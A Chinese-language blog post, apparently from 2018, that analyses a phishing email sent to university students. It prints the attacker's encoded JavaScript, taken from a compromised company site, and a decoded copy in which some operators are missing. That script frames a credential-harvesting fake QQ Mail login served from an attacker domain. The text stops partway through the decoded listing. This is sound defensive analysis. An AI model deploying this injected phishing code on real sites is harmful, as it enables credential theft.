<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="Leticia&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="Leticia&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Leticia&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/6/"/>





  <title> Leticia's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Leticia's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/分析并复现一次iframe框架钓鱼行为/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" itemprop="url">
                  分析并复现一次iframe框架钓鱼行为
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-21T20:55:29+08:00">
                2018-05-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" class="leancloud_visitors" data-flag-title="分析并复现一次iframe框架钓鱼行为">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， <a href="http://mrw.so/" target="_blank" rel="noopener">http://mrw.so/</a> 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing01.png" alt=""></p>
<h2 id="0x01-尝试"><a href="#0x01-尝试" class="headerlink" title="0x01 尝试"></a>0x01 尝试</h2><p>点击短链接跳转到了 <a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a><br> 并且在加载出来之前一直显示一个很刻意的“链接中”，并且url有好长的路径，看样子像是哪个公司的服务器被钓鱼作者放了点东西，直接访问了下 <a href="http://www.topaone.com" target="_blank" rel="noopener">http://www.topaone.com</a> 发现果然是一个叫京品设计的公司。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing02.png" alt=""></p>
<p>加载出来之后是一个qq邮箱的登陆解面，不过做的很不走心，网页title都没写qq邮箱，title旁边的ico也是qq空间而不是qq邮箱的ico，登陆框除了账号密码两个输入框和登陆按钮以外都是不可点击状态。随便填一个账号密码弹窗提示密码错误，而且返回信息的网址应该是钓鱼作者的服务器。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing03.png" alt=""></p>
<p>还有一点是在进入这个链接的时候，即使已经到了邮箱登陆页面，浏览器仍然一直处于加载状态，以之前自己写钓鱼网站的经验来猜测，对方应该使用了window.onload配合document.write来覆盖整个页面，所以每次加载完都会重触发一次window.onload，无限循环。</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>见识了一下大致的访问过程，该抓包看看具体是怎么个流程了，在burpsuite中截取数据包，发现访问到的页面返回了一堆编码过的js代码。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing04.png" alt=""></p>
<p>初步判断这个钓鱼作者在京品设计公司的服务器上面挂了一个存储型xss。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="undefined">document.write(unescape("%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253C%2521--%2523Include%2520File%253D%2522SqlIn.Asp%2522--%253E%250D%250A%253Chtml%253E%250D%250A%253Chead%253E%250D%250A%253Cmeta%2520http-equiv%253D%2522Content-Language%2522%2520content%253D%2522zh-cn%2522%253E%250D%250A%253Cmeta%2520HTTP-EQUIV%253D%2522Content-Type%2522%2520CONTENT%253D%2522text/html%253B%2520charset%253Dgb2312%2522%253E%250D%250A%253Ctitle%253Eukkifddssfggg---kuasa......%253C/title%253E%250D%250A%253Cmeta%2520name%253D%2522description%2522%2520content%253D%2522%2522%253E%250D%250A%253Clink%2520href%253D%2522index_files/88.css%253Fmax_age%253D31536000%2526d%253D1333188324128%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%253Clink%2520href%253D%2522index_files/home_fixed.css%253Fmax_age%253D31536000%2526d%253D1334659684120%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%250D%250A%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%250D%250A%253Cstyle%2520id%253D%2522mainJSBg%2522%2520type%253D%2522text/css%2522%253E%250D%250A.lay_background%257Bbackground-repeat%253Ano-repeat%253Bbackground-position%253Acenter%2520top%253Bbackground-attachment%253Ascroll%253Bbackground-image%253Aurl%252864538_top.jpg%2529%253B%257D%250D%250Abody%257Bbackground-image%253Aurl%252864538_bg.jpg%2529%253B%2520background-repeat%253Arepeat%253B%257D%253C/style%253E%250D%250A%250D%250A%250D%250A%253Cstyle%2520type%253D%2522text/css%2522%2520id%253D%2522dynamicStyle%2522%253E%250D%250A.ownermode%257Bdisplay%253Anone%253B%257D%250D%250A.clientmode%257Bdisplay%253A%253B%257D%250D%250A.editmode%257Bdisplay%253Anone%253B%257D%250D%250A.customoff%257Bdisplay%253A%253B%257D%250D%250A.alphamode%257Bdisplay%253Anone%253B%257D%250D%250A%253C/style%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253C/style%253E%250D%250A%253Clink%2520rel%253D%2522Shortcut%2520Icon%2522%2520href%253D%2522http%253A//ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%253E%250D%250A%253C/head%253E%250D%250A%253Cbody%2520id%253D%2522QZ_Body%2522%2520class%253D%2522bg_body%2520%2520%2522%253E%250D%250A%250D%250A%253Cdiv%2520id%253D%2522welcomeflash%2522%2520style%253D%2522position%253Afixed%253B_position%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bbackground-color%253Awhite%253Btext-align%253Acenter%253Bwidth%253A100%2525%253Bz-index%253A30000%253Bheight%253A10000px%253B%2522%2520onClick%253D%2522wSwf_obj_swf.call%2528this%2529%2522%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bposition%253Aabsolute%253Bleft%253A0%253Btop%253A0%253Bbackground%253Awhite%253Bheight%253A100%2525%253B%2522%253E%250D%250A%250D%250A%253C%25u94FE%25u63A5%25u4E2D%25B7%25B7%25B7%25B7%25B7%253E%250D%250A%250D%250A%253C/div%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bcursor%253Apointer%253Bposition%253Aabsolute%253Bleft%253A0px%253Bbackground%253Aurl%2528about%253Ablank%2529%253Bopacity%253A0%253Bz-index%253A30001%253Btop%253A0px%253Bheight%253A100%2525%2522%253E%253C/div%253E%253C/div%253E%250D%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250D%250A%2528function%2528%2529%2520%257B%250D%250A%2509var%2520wel%253Ddocument.getElementById%2528%2527welcomeflash%2527%2529%252Ctimer%252Cch%252C_s%253Dnew%2520Function%253B%250D%250A%2509window.wSwf_obj_swf%2520%253D%2520window.wSwf_obj_swf_s%253Dfunction%2528%2529%2520%257B%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522%2522%253B%250D%250A%2509%2509wel%2520%2526%2526%2520%2528wel.innerHTML%2520%253D%2520%2527%2527%2529%253B%250D%250A%2509%2509wel%2520%2526%2526%2520document.body.removeChild%2528wel%2529%253B%250D%250A%2509%2509window.removeEventListener%253Fwindow.removeEventListener%2528%2527resize%2527%252C_s%2529%253A%2528window.detachEvent%2526%2526window.detachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%2509clearTimeout%2528timer%2529%253B%250D%250A%2509%257D%253B%250D%250A%2509timer%2520%253D%2520setTimeout%2528wSwf_obj_swf%252C%25204000%2529%253B%250D%250A%2509if%2520%2528wel%2529%2520%257B%250D%250A%2509%2509_s%253Dfunction%2528%2529%257B%250D%250A%2509%2509%2509ch%253Ddocument.documentElement.clientHeight%253B%250D%250A%2509%2509%2509wel.children%255B0%255D.style.paddingTop%2520%253D%2520Math.floor%2528Math.max%25280%252Cch%2520-%2520590%2529%2520/%25202%2529+%2527px%2527%253B%250D%250A%2509%2509%257D%253B%250D%250A%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522hidden%2522%253B%250D%250A%2509%2509_s%2528%2529%253B%250D%250A%2509%2509window.addEventListener%253Fwindow.addEventListener%2528%2527resize%2527%252C_s%252Cfalse%2529%253A%2528window.attachEvent%2526%2526window.attachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%257D%250D%250A%257D%2529%2528%2529%253B%250D%250A%253C/script%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%250D%250A%253Ciframe%2520id%253D%2522iframe%2522%2520%2520%2520height%253D%2522100%2525%2522%2520width%253D%2522100%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%250D%250A%2520%2520%253Cscript%2520%2520%2520language%253D%2522javascript%2522%253E%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520var%2520pos%252Cstr%252Cpara%252Curl%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520str%2520%253D%2520window.location.href%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520pos%2520%253D%2520str.indexOf%2528%2522%253F%2522%2529%2520%2520%253B%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520url%2520%253D%2520str.substring%2528pos+1%2529%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528pos%253E0%2529%257B%2520%2520%250D%250A%2509%2509%2509%2509n%253D%2527http%253A//ujhgdgjalkfja2.tk/%2527%253B%250D%250A%2509%2509%2509%2509j1%253Dn+url%253B%250D%250A%2509%2509%2509%2509c%253D%2527%253Clink%2520rel%253D%2522shortcut%2520icon%2522%2520href%253D%2522https%253A//s.tbcdn.cn/apps/login/static/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%2520/%253E%2527%253B%250D%250A%2509%2509%2509%2509b%253D%2527%253Chtml%253E%253Chead%253E%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%2527%253B%250D%250A%2509%2509%2509%2509a%253D%2527%253Ciframe%2520name%253D%2522main%2522%2520%2520height%253D%2522100%2525%2522%2520src%253D%2522%2527%253B%250D%250A%2509%2509%2509%2509k1%253D%2527%2522%2520width%253D%2522101%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%2527%253B%250D%250A%2520%2509%2509%2509%2509var%2520%2520d%2520%253D%2520%2520window.frames%255B0%255D%253B%250D%250A%2520%2520%2509%2509%2509%2509d.document.write%2528c+b+a+j1+k1%2529%253B%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520else%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%253C/script%253E%250D%250A%2520%2520%250D%250A%250D%250A%253Chead%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E"));</span></span><br><span class="line"><span class="undefined">//--&gt;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个钓鱼网站作者没有对代码做什么加密，明显只是多次编码过的js代码，直接url解码两次，得到清晰的js代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="xml">document.write(unescape("<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="xml">document.write(unescape("<span class="comment">&lt;!--#Include File="SqlIn.Asp"--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Language"</span> <span class="attr">content</span>=<span class="string">"zh-cn"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Content-Type"</span> <span class="attr">CONTENT</span>=<span class="string">"text/html; charset=gb2312"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>ukkifddssfggg---kuasa......<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/88.css?max_age=31536000&amp;d=1333188324128"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/home_fixed.css?max_age=31536000&amp;d=1334659684120"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">"mainJSBg"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">.lay_background&#123;background-repeat:no-repeat;background-position:center top;background-attachment:scroll;background-image:url(64538_top.jpg);&#125;</span></span><br><span class="line"><span class="xml">body&#123;background-image:url(64538_bg.jpg); background-repeat:repeat;&#125;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">id</span>=<span class="string">"dynamicStyle"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">.ownermode&#123;display:none;&#125;</span></span><br><span class="line"><span class="undefined">.clientmode&#123;display:;&#125;</span></span><br><span class="line"><span class="undefined">.editmode&#123;display:none;&#125;</span></span><br><span class="line"><span class="undefined">.customoff&#123;display:;&#125;</span></span><br><span class="line"><span class="undefined">.alphamode&#123;display:none;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"Shortcut Icon"</span> <span class="attr">href</span>=<span class="string">"http://ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"QZ_Body"</span> <span class="attr">class</span>=<span class="string">"bg_body  "</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"welcomeflash"</span> <span class="attr">style</span>=<span class="string">"position:fixed;_position:absolute;top:0;left:0;background-color:white;text-align:center;width:100%;z-index:30000;height:10000px;"</span> <span class="attr">onClick</span>=<span class="string">"wSwf_obj_swf.call(this)"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;position:absolute;left:0;top:0;background:white;height:100%;"</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">链接中?????</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;cursor:pointer;position:absolute;left:0px;background:url(about:blank);opacity:0;z-index:30001;top:0px;height:100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">(function() &#123;</span></span><br><span class="line"><span class="undefined">	var wel=document.getElementById('welcomeflash'),timer,ch,_s=new Function;</span></span><br><span class="line"><span class="undefined">	window.wSwf_obj_swf = window.wSwf_obj_swf_s=function() &#123;</span></span><br><span class="line"><span class="undefined">		document.documentElement.style.overflow = "";</span></span><br><span class="line"><span class="undefined">		wel &amp;&amp; (wel.innerHTML = '');</span></span><br><span class="line"><span class="undefined">		wel &amp;&amp; document.body.removeChild(wel);</span></span><br><span class="line"><span class="undefined">		window.removeEventListener?window.removeEventListener('resize',_s):(window.detachEvent&amp;&amp;window.detachEvent('onresize',_s));</span></span><br><span class="line"><span class="undefined">		clearTimeout(timer);</span></span><br><span class="line"><span class="undefined">	&#125;;</span></span><br><span class="line"><span class="undefined">	timer = setTimeout(wSwf_obj_swf, 4000);</span></span><br><span class="line"><span class="undefined">	if (wel) &#123;</span></span><br><span class="line"><span class="undefined">		_s=function()&#123;</span></span><br><span class="line"><span class="undefined">			ch=document.documentElement.clientHeight;</span></span><br><span class="line"><span class="undefined">			wel.children[0].style.paddingTop = Math.floor(Math.max(0,ch - 590) / 2) 'px';</span></span><br><span class="line"><span class="undefined">		&#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		document.documentElement.style.overflow = "hidden";</span></span><br><span class="line"><span class="undefined">		_s();</span></span><br><span class="line"><span class="undefined">		window.addEventListener?window.addEventListener('resize',_s,false):(window.attachEvent&amp;&amp;window.attachEvent('onresize',_s));</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;)();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">               var pos,str,para,url;  </span></span><br><span class="line"><span class="undefined">                str = window.location.href;  </span></span><br><span class="line"><span class="undefined">                pos = str.indexOf("?")  ;</span></span><br><span class="line"><span class="undefined">                url = str.substring(pos 1);  </span></span><br><span class="line"><span class="undefined">                if (pos&gt;0)&#123;  </span></span><br><span class="line"><span class="undefined">				n='http://ujhgdgjalkfja2.tk/';</span></span><br><span class="line"><span class="undefined">				j1=n url;</span></span><br><span class="line"><span class="xml">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span 